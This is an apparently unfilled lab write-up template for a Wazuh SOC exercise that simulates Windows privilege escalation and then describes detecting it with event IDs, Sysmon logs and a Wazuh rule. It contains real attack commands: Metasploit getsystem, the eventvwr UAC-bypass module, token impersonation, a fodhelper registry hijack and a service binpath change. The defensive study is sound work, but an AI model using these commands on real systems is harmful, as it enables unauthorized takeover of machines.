# 🔺 Attack 05 – Privilege Escalation (Windows Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Privilege Escalation via UAC Bypass / Token Manipulation |
| **Target** | Windows 10 Endpoint (WIN-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Privilege Escalation |
| **MITRE Technique** | T1548.002 – Bypass User Account Control |
| **Severity** | Critical |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate privilege escalation techniques on the Windows endpoint, attempting to elevate from a standard user context to SYSTEM/Administrator — testing Wazuh's detection of elevation control abuse and token manipulation.

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| WIN-ENDPOINT | Target/Victim | `192.168.x.x` | Windows 10 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Attack Diagram

```
┌──────────────┐      Initial Access        ┌──────────────────┐
│  Kali Linux  │ ────────────────────────▶  │  WIN-ENDPOINT    │
│  (Attacker)  │                             │  (Victim)        │
└──────────────┘                             │                  │
                                             │  User ──▶ Admin  │
                                             │  Admin ──▶ SYSTEM│
                                             │  (Priv Esc)      │
                                             └────────┬─────────┘
                                                      │
                                             ┌────────▼─────────┐
                                             │  Wazuh Server    │
                                             └──────────────────┘
```

## Kali Commands Used

```bash
# Meterpreter privilege escalation
meterpreter> getuid
meterpreter> getsystem
meterpreter> getuid

# UAC Bypass modules
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
exploit

# Token impersonation
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
```

**On Target (simulated commands):**
```powershell
# Check current privileges
whoami /priv

# UAC bypass via fodhelper
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Service exploitation
sc qc <vulnerable_service>
sc config <vulnerable_service> binpath="C:\Windows\Temp\payload.exe"
```

## Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/win-attack05-initial-privs.png` | Initial user privileges |
| `screenshots/win-attack05-escalation.png` | Privilege escalation execution |
| `screenshots/win-attack05-system-access.png` | SYSTEM level access achieved |
| `screenshots/win-attack05-wazuh-alert.png` | Wazuh privilege escalation alert |

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | <!-- Rule --> | Privilege escalation detected | <!-- Level --> | <!-- Time --> |

## Relevant Event IDs

| Event ID | Source | Description | Relevance |
|---|---|---|---|
| 4672 | Windows Security | Special Privileges Assigned | Elevated token usage |
| 4688 | Windows Security | Process Creation | High-integrity process spawned |
| 1 | Sysmon | Process Creation | Privilege escalation tool execution |
| 12/13 | Sysmon | Registry Events | UAC bypass registry modifications |
| 10 | Sysmon | Process Access | Token manipulation attempts |

## Sysmon Events

```xml
<Event>
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\fodhelper.exe</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="ParentImage"><!-- Parent --></Data>
  </EventData>
</Event>
```

## Log Analysis

1. **Finding 1:** <!-- Initial access privilege level -->
2. **Finding 2:** <!-- Escalation method used and success/failure -->
3. **Finding 3:** <!-- Evidence of elevated process execution -->

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Privilege Escalation |
| **Technique ID** | T1548.002 |
| **Technique Name** | Abuse Elevation Control Mechanism: Bypass User Account Control |
| **Procedure** | Adversary exploited UAC bypass via fodhelper.exe registry hijack to spawn an elevated command shell without UAC prompt |
| **Detection Opportunity** | Monitor for registry modifications to `ms-settings\shell\open\command` and auto-elevated process spawning child processes |

## Detection Logic

```xml
<rule id="100005" level="14">
  <if_sid>61613</if_sid>
  <field name="win.eventdata.targetObject" type="pcre2">ms-settings\\shell\\open\\command</field>
  <description>UAC Bypass attempt detected - fodhelper registry hijack</description>
  <mitre>
    <id>T1548.002</id>
  </mitre>
</rule>
```

## Investigation Process

1. **Alert Triage:** Wazuh flagged suspicious registry modification / elevated process
2. **Privilege Analysis:** Compared initial vs. final privilege levels
3. **Method Identification:** Identified UAC bypass / token manipulation technique
4. **Process Chain:** Reconstructed full process execution chain
5. **Impact Assessment:** Determined scope of SYSTEM-level access
6. **Verdict:** Confirmed privilege escalation — standard user to SYSTEM

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- Critical --> | <!-- Evidence --> |
| 2 | <!-- Finding --> | <!-- Critical --> | <!-- Evidence --> |

## Lessons Learned

- <!-- UAC configuration and its limitations -->
- <!-- Token privilege monitoring effectiveness -->
- <!-- Need for application whitelisting -->
- <!-- Sysmon rules for privilege escalation detection -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
